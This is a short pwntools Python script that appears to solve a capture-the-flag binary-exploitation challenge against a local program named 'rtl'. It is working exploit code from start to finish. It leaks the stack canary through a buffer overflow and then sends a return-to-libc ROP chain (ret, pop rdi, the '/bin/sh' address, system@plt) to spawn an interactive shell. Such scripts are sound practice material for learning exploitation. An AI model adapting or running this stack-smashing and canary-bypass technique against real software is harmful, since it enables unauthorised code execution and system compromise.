from pwn import *

def slog(n, m):
    return success(': '.join([n, hex(m)]))

p = process('./rtl')

elf = ELF('./rtl')
system_plt = elf.plt['system']
slog('system_plt', system_plt)
bin_sh = list(elf.search(b'/bin/sh'))[0]
slog('bin_sh', bin_sh)
r = ROP(elf)

pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
slog('pop_rdi', pop_rdi)
# for movaps in system(), if got SIGSEGV, try this.
ret = r.find_gadget(['ret'])[0]
slog('ret', ret)

#1 find canary  buf: rbp - 0x40, canary: rbp - 0x8
buf2rbp = 0x40
buf2cnry = 0x40 - 0x8
payload = b'A' * (buf2cnry + 1)

p.recvuntil(b'Buf: ')
p.send(payload)
p.recvuntil(payload)
canary = u64(b'\x00' + p.recvn(7))
slog('canary', canary)

#2 Exploit
payload = b'A' * buf2cnry + p64(canary) + b'B' * 8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system_plt)

p.sendafter(b'Buf: ', payload)

p.interactive()
